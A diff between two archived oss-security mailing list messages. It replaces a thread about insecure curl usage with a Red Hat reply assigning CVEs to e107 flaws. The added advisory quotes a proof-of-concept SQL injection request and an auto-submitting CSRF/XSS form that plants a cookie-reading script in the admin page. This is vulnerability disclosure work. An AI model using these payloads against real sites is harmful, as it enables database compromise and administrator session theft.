@@ -1,53 +1,120 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/11/29/6
-Message-ID: <20121129214436.GA4929@pisco.westfalen.local>
-Date: Thu, 29 Nov 2012 22:44:36 +0100
-From: Moritz Mühlenhoff <jmm@...til.org>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/03/29/3
+Message-ID: <4F73EDFA.3040400@redhat.com>
+Date: Wed, 28 Mar 2012 23:07:06 -0600
+From: Kurt Seifried <kseifried@...hat.com>
 To: oss-security@...ts.openwall.com
-Subject: Re: CVE request: Curl insecure usage
+CC: Henri Salo <henri@...v.fi>
+Subject: Re: CVE-request: e107 HTB23004
 Content-Type: text/plain; charset=utf-8
 
+On 03/28/2012 12:38 AM, Henri Salo wrote:
+> I won't veriify these vulnerabilities manually. Please assign 2011 CVE-identifier.
+> 
+> Original advisory: https://www.htbridge.com/advisory/multiple_vulnerabilities_in_e107_1.html
+> These vulnerabilities have been fixed in 12306 revision.
+> 
+> Please do not ask me why changelog entry does not say anything about security problems. HTBridge has tested that vulnerabilities do not exist after patches.
+> 
+> From HTBridge:
+> 
+> On the 6 of July a correction was released:
+> http://e107.svn.sourceforge.net/viewvc/e107/trunk/e107_0.7/e107_admin/users_extended.php?revision=12306&view=markup
+> 
+> Details of this corrections are available here:
+> http://e107.svn.sourceforge.net/viewvc/e107/trunk/e107_0.7/e107_admin/users_extended.php?r1=12225&r2=12306
+> 
+> Corrections for our vulnerabilities are marked as "User extended fields administration improvements and cleanup".
+> 
+> The changelog: http://e107.org/svn_changelog.php?version=0.7.26 confirms that this correction was applied to e107 0.7.26 version.
+> 
+> - Henri Salo
 
-On Wed, Nov 28, 2012 at 01:45:26PM -0700, Kurt Seifried wrote:
-> -----BEGIN PGP SIGNED MESSAGE-----
-> Hash: SHA1
-> 
-> On 11/26/2012 11:42 AM, Kurt Seifried wrote:
-> > On 11/26/2012 08:06 AM, Moritz Muehlenhoff wrote:
-> >> Hi, during the triage of the SSL client bugs spotted by the 
-> >> http://www.cs.utexas.edu/~shmat/shmat_ccs12.pdf paper Debian 
-> >> developer Alessandro Ghedini discovered two more applications
-> >> using Curl in an insecure manner:
-> > 
-> >> 1. opendnssec (in the eppclient tool) 
-> >> http://lists.opendnssec.org/pipermail/opendnssec-user/2012-November/002296.html
-> 
-> Please
-> >> 
-> use CVE-2012-5582 for opendnssec: insecure usage of curl
-> 
-> >> 2. PHPcas (used by Moodle e.g.): 
-> >> https://github.com/Jasig/phpCAS/pull/58
-> 
-> Please use CVE-2012-5583 for phpCAS: insecure usage of curl
-> 
-> >> Please assign CVE IDs for these.
-> > 
-> >> Cheers, Moritz
-> > 
-> > 
-> > Have these been receiving individual CVE's? I can't find any
-> > offhand, can you provide examples of others?
-> 
-> Also can someone collate and post a list of all the other apps using
-> curl insecurely and need CVE's with appropriate links to the
-> upstreams/etc? Thanks.
+Quoted the advisory below, please include this stype of stuff in future
+(so I can reply clearly, and in case the wbe page goes away, etc.).
 
-There are some, which are potentially affected, but where discussion
-with upstream is still pending.
+Advisory Details:
 
-Shall we go ahead and post them or do you prefer to have them sorted
-out with upstream first?
+============================================================
+1. SQL injection in e107
 
-Cheers,
-        Moritz
+Please use CVE-2011-4946 for this issue
+
+The vulnerability exists due to failure in the
+"/e107_admin/users_extended.php" script to properly sanitize
+user-supplied input in "user_field" variable. Successful exploitation of
+the vulnerability requires administrator's privileges, and
+"magic_quotes_gpc" to be disabled. Attacker can alter queries to the
+application SQL database, execute arbitrary queries to the database,
+compromise the application, access or modify sensitive data, or exploit
+various vulnerabilities in the underlying SQL database.
+
+Attacker can use browser to exploit this vulnerability. The following
+PoC code is available:
+
+POST /e107_admin/users_extended.php?cat= HTTP/1.1
+Host: HOST
+Cookie: <valid session cookies>
+Content-Type: application/x-www-form-urlencoded
+Content-Length:
+
+user_field=sss','',0, ','','', '0',
+'253','0','0','253','0','0'),('0',(select
+user()),'',0,'','','','0','253','0','0','253','0','0'),('0','dfg&user_applicable=253&user_re
+ad=0&user_write=253&add_category=Add+category
+
+============================================================
+2. XSS in e107
+
+Please use CVE-2011-4947 for this issue
+
+User can execute arbitrary JavaScript code within the vulnerable
+application.
+
+The vulnerability exists due to failure in the
+"/e107_admin/users_extended.php" script to properly sanitize
+user-supplied input in "user_include" variable. Successful exploitation
+of this vulnerability could result in a compromise of the application,
+theft of cookie-based authentication credentials, disclosure or
+modification of sensitive data.
+
+This XSS vulnerability can be exploited by a malicious user during an
+CSRF attack against logged-in website administrator to steal his
+credentials and/or perform any authorized actions with administrator's
+privileges.
+
+An attacker should make logged-in victim (e.g. website administrator)
+visit a malicious web page to exploit this vulnerability. The following
+PoC is available:
+
+poc.html
+<script>
+setTimeout("document.getElementById('f1').src='http://HOST/e107_admin/users_extended.php'",2000);
+</script>
+<iframe id=f1 src='form.html'></iframe>
+
+form.html
+<form method="POST"
+action="http://HOST/e107_admin/users_extended.php?editext" name=m>
+<input type="hidden" name="user_field" value="abcde1f1">
+
+<input type="hidden" name="user_text" value="12121">
+<input type="hidden" name="user_type" value="1">
+<input type="hidden" name="user_include"
+value='"><script>alert(document.cookie)</script>'>
+<input type="hidden" name="add_field" value="1">
+<input type="hidden" name="user_parent" value="0">
+<input type="hidden" name="user_required" value="0">
+<input type="hidden" name="user_applicable" value="255">
+<input type="hidden" name="user_read" value="0">
+<input type="hidden" name="user_write" value="253">
+<input type="hidden" name="user_hide" value="0">
+<input type=submit>
+</form>
+<script>
+document.m.submit();
+</script>
+============================================================
+
+-- 
+Kurt Seifried Red Hat Security Response Team (SRT)
